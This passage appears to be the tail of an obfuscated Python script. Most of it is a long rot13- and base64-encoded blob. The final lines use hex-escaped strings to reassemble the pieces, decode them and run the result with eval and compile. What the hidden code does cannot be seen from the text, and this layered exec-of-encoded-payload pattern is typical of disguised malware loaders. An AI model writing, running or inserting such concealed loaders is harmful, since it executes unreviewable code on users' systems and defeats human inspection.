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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
